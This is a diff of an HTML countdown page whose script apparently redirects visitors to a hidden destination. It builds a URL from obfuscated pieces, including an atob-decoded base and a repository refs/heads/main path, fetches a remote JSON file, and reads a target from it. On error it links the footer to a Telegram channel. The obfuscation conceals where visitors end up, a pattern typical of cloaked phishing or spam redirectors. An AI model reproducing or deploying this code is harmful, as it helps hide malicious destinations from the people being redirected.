@@ -68,10 +68,8 @@ svg circle {
   text-align: center;
   color: #888;
   font-size: small;
-}
-a {
-    user-select: none;
-    text-decoration: none;
+  user-select: none;
+  text-decoration: none;
 }
 </style>
 </head>
@@ -80,7 +78,7 @@ a {
 <div id="countdown-number"></div>
 <svg><circle r="18" cx="20" cy="20"></circle></svg>
 </div>
-<span id="footer">Report Here if you are not redirect automatically.</span>
+<span id="footer">CONTACT US</span>
 <script>
 var countdownNumberEl = document.getElementById('countdown-number');
 var countdown = 5;
@@ -94,9 +92,9 @@ setInterval(function() {
   countdown = --countdown <= 0 ? 5 : countdown;
   countdownNumberEl.textContent = countdown;
 }, 1000);
-const a = atob('a'+g)+s+u+s+r+s+'refs'+s+'heads'+s+'main'+s+f;
+const a = s+u+s+r+s+'refs'+s+'heads'+s+'main'+s+f;
 window.setTimeout(function() {
-  fetch(a)
+  fetch(atob('a'+g)+a)
     .then(response => response.json())
     .then(data => {
         const l = data.stations[0].parking;
@@ -113,7 +111,6 @@ window.setTimeout(function() {
       console.error('Error:', error);
       alert('Error: ' + error.message);
       document.getElementById('footer').style.opacity = 1;
-      document.getElementById('footer').setAttribute('l', l);
       document.getElementById('footer').setAttribute('onclick', 'window.location.href = "https://t.me/KamaLoka_Club";');
     });
 }, 3000);
